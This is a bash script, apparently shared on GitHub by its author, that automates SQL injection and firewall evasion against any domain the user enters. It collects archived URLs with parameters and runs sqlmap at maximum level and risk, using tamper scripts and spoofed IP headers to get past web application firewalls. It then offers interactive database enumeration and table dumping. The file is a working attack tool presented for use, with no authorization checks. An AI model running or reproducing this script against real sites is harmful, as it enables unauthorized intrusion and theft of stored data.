#!/bin/bash

# الألوان
G='\033[0;32m'
R='\033[0;31m'
Y='\033[1;33m'
C='\033[0;36m'
NC='\033[0m'

banner() {
    clear
    echo -e "${C}    ███████ ██████  ███████  █████  ██ "
    echo "    ██      ██   ██ ██      ██   ██ ██ "
    echo "    █████   ██████  ███████ ███████ ██ "
    echo "    ██      ██   ██      ██ ██   ██ ██ "
    echo "    ██      ██   ██ ███████ ██   ██ ███████ "
    echo -e "    ${Y}   WAF BYPASS (NO PROXY) | BY: FASIAL${NC}"
    echo -e "    ${G}GitHub: https://github.com/f-a2${NC}"
    echo -e "    ${G}Site: https://d7.ct.ws/f.html?i=2${NC}"
    echo -e "    ${R}--------------------------------------------${NC}"
}

banner
read -p "[?] Enter Target Domain: " target
[ -z "$target" ] && exit 1

# تنظيف وتحضير الروابط
echo -e "${Y}[*] Cleaning workspace and fetching URLs...${NC}"
rm -f all_urls.txt inject_this.txt final_targets.txt
waybackurls $target | grep "=" > inject_this.txt
gf sqli inject_this.txt > final_targets.txt 2>/dev/null || cp inject_this.txt final_targets.txt

if [ ! -s final_targets.txt ]; then
    echo -e "${R}[X] No injectable URLs found!${NC}"; exit 1
fi

echo -e "${G}[+] Found $(wc -l < final_targets.txt) potential links.${NC}"
echo -e "${Y}[!] Starting High-Level Bypass Attack...${NC}"

# الأمر الذهبي لتخطي الحماية بدون بروكسي
# أضفنا --drop-set-cookie لتجنب تتبع الجلسة من الـ WAF
sqlmap -m final_targets.txt --batch --random-agent \
--tamper=between,charlike,randomcase,space2comment,union2comment,versionedmorekeywords,equaltolike \
--header="X-Forwarded-For: 8.8.8.8" \
--header="X-Originating-IP: 1.1.1.1" \
--header="X-Remote-IP: 127.0.0.1" \
--header="X-Client-IP: 127.0.0.1" \
--level=5 --risk=3 --threads=4 --delay=0.5 \
--drop-set-cookie --dbs --output-dir="./results_$target"

# التفاعل مع النتائج
while true; do
    echo -e "\n${Y}[1] Show Databases & Continue | [0] Exit${NC}"
    read -p "> " choice
    if [ "$choice" == "1" ]; then
        echo -e "${C}Enter the Database Name you want to explore:${NC}"
        read dbname
        sqlmap -m final_targets.txt --batch --random-agent -D $dbname --tables
        echo -e "${Y}[?] Do you want to DUMP a table? (y/n)${NC}"
        read -p "> " dmp
        if [ "$dmp" == "y" ]; then
            echo -e "${C}Enter Table Name:${NC}"
            read tname
            sqlmap -m final_targets.txt --batch --random-agent -D $dbname -T $tname --dump
        fi
    else
        echo -e "${G}Happy Hacking! Exiting...${NC}"; exit 0
    fi
done
